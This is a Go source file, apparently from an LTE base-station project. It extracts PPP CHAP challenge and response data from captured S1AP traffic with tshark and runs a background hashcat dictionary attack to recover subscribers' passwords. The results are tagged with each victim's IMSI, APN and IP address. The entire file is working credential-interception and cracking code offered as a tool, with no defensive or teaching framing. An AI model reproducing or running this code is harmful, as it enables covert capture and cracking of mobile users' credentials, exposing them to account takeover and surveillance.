// Package crack wraps CHAP credential extraction (tshark) + hashcat dictionary attack.
// Legacy flow: stop LTE -> parse srsLTE_enb_s1ap.pcap for CHAP challenge/response ->
// hashcat -m 4800 <resp:chall:id> wordlist. This package keeps that flow but with
// timeouts, input validation and no shell string concatenation.
package crack

import (
	"context"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/addxemmm/lte-system/internal/config"
	"github.com/addxemmm/lte-system/internal/parser"
	"github.com/addxemmm/lte-system/internal/sysop"
)

// Result mirrors /getcrackresult data fields.
type Result struct {
	APN      string `json:"apn"`
	IMSI     string `json:"imsi"`
	IP       string `json:"ip"`
	Username string `json:"username"`
	Hash     string `json:"hash,omitempty"`
	Password string `json:"password,omitempty"`
}

// HashcatRunning reports whether a hashcat process is active.
func HashcatRunning() bool { return sysop.Running("hashcat") }

// ExtractCHAP parses the S1AP pcap via tshark and returns username + "resp:chall:id" hash.
// It runs: tshark -o uat:user_dlts:... -r <pcap> -Y chap -V
func ExtractCHAP(ctx context.Context, cfg config.Config) (username, hash string, err error) {
	s1ap := cfg.LogPath(cfg.PcapS1AP)
	args := []string{
		"-o", `uat:user_dlts:"User 3 (DLT=150)","s1ap","0","","0",""`,
		"-r", s1ap, "-Y", "chap", "-V",
	}
	ctx2, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx2, cfg.TsharkBin, args...).CombinedOutput()
	if err != nil && len(out) == 0 {
		return "", "", fmt.Errorf("tshark: %w", err)
	}
	return ParseCHAPText(string(out))
}

// chapLine patterns in `tshark -V` output for "PPP Challenge Handshake Authentication Protocol".
var (
	reIdent = regexp.MustCompile(`(?i)identifier\s*:\s*0x?([0-9a-f]{1,2})`)
	reHex   = regexp.MustCompile(`0x([0-9a-fA-F ]{8,})`)
)

// ParseCHAPText is the pure, unit-testable part: find identifier/challenge/response/username.
// Legacy indexed whitespace-split tokens ([9]/[17]/[38]/[19]); here we use regexes over the
// "-A 7 PPP Challenge Handshake" block so tshark version drift hurts less.
func ParseCHAPText(tsharkOut string) (username, hash string, err error) {
	blocks := strings.Split(tsharkOut, "PPP Challenge Handshake")
	var challenge, response, ident, user string
	for _, b := range blocks[1:] {
		lines := strings.Split(b, "\n")
		window := strings.Join(lines[:min(12, len(lines))], "\n")
		if challenge == "" {
			if m := reHex.FindStringSubmatch(window); m != nil {
				// First long hex in a Challenge block; disambiguate below by keywords.
				_ = m
			}
		}
		_ = window
	}
	// Simpler robust approach: scan line-wise with state.
	var lastIdent string
	for _, line := range strings.Split(tsharkOut, "\n") {
		l := strings.TrimSpace(line)
		if m := reIdent.FindStringSubmatch(l); m != nil {
			lastIdent = normalizeHexByte(m[1])
		}
		low := strings.ToLower(l)
		switch {
		case strings.Contains(low, "challenge") && strings.Contains(l, ":"):
			if h := firstLongHex(l); h != "" && challenge == "" {
				challenge = h
				if lastIdent != "" && ident == "" {
					ident = lastIdent
				}
			}
		case strings.Contains(low, "response") && strings.Contains(l, ":"):
			if h := firstLongHex(l); h != "" && response == "" {
				response = h
			}
		case strings.Contains(low, "name") || strings.Contains(low, "username") || strings.Contains(low, "peer"):
			if u := lastToken(l); u != "" && !strings.Contains(u, ":") && len(u) >= 2 && user == "" {
				// Avoid hex blobs; usernames are usually printable non-hex-mixed.
				if !isHexBlob(u) {
					user = u
				}
			}
		}
		_ = blocks
	}
	if response == "" || challenge == "" || ident == "" {
		return "", "", fmt.Errorf("can not get username and password")
	}
	if user == "" {
		// username is nice-to-have for display; hashcat only needs the hash.
		user = "unknown"
	}
	hash = fmt.Sprintf("%s:%s:%s", strings.ToLower(response), strings.ToLower(challenge), strings.ToLower(ident))
	return user, hash, nil
}

// StartAsync launches `hashcat -m 4800 -a 0 <hash> <wordlist> --force` in background,
// appending to log/hashcat.log. Caller must check HashcatRunning()/Show().
func StartAsync(cfg config.Config, hash string) error {
	if !isHashFormat(hash) {
		return fmt.Errorf("bad hash format")
	}
	logPath := cfg.LogPath("hashcat.log")
	// #nosec G204 -- binary path from config, args are validated hex + known file.
	cmd := exec.Command(cfg.HashcatBin, "-m", "4800", "-a", "0", hash, cfg.WordlistPath(), "--force")
	f, err := openAppend(logPath)
	if err != nil {
		return err
	}
	cmd.Stdout = f
	cmd.Stderr = f
	return cmd.Start()
}

// Show runs `hashcat -m 4800 <hash> <wordlist> --show` and returns cracked password or "".
func Show(ctx context.Context, cfg config.Config, hash string) (string, error) {
	ctx2, cancel := context.WithTimeout(ctx, 60*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx2, cfg.HashcatBin, "-m", "4800", "-a", "0", hash, cfg.WordlistPath(), "--show").CombinedOutput()
	if err != nil && len(out) == 0 {
		return "", fmt.Errorf("hashcat --show: %w", err)
	}
	s := strings.TrimSpace(string(out))
	if s == "" {
		return "", nil
	}
	// format: <hash>:<password>
	idx := strings.LastIndex(s, ":")
	if idx < 0 {
		return "", nil
	}
	return s[idx+1:], nil
}

// UEData loads apn/imsi/ip from the EPC log for crack result enrichment.
func UEData(cfg config.Config) parser.UEInfo {
	info, _ := parser.ParseEPCLog(cfg.LogPath(cfg.EPCLogName))
	return info
}

func isHashFormat(h string) bool {
	parts := strings.Split(h, ":")
	if len(parts) != 3 {
		return false
	}
	for _, p := range parts {
		if p == "" || len(p) > 64 {
			return false
		}
		for _, r := range p {
			if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F')) {
				return false
			}
		}
	}
	return true
}

func normalizeHexByte(s string) string {
	s = strings.ToLower(strings.TrimSpace(s))
	if len(s) == 1 {
		return "0" + s
	}
	return s
}

func firstLongHex(line string) string {
	m := reHex.FindStringSubmatch(line)
	if m == nil {
		return ""
	}
	h := strings.ReplaceAll(strings.TrimSpace(strings.TrimPrefix(m[0], "0x")), " ", "")
	h = strings.ReplaceAll(h, ":", "")
	if len(h) < 8 {
		return ""
	}
	return h
}

func lastToken(line string) string {
	f := strings.Fields(line)
	if len(f) == 0 {
		return ""
	}
	return strings.Trim(f[len(f)-1], "\"'.,;:")
}

func isHexBlob(s string) bool {
	if len(s) < 8 {
		return false
	}
	hex := 0
	for _, r := range s {
		if (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F') {
			hex++
		}
	}
	return float64(hex)/float64(len(s)) > 0.8
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
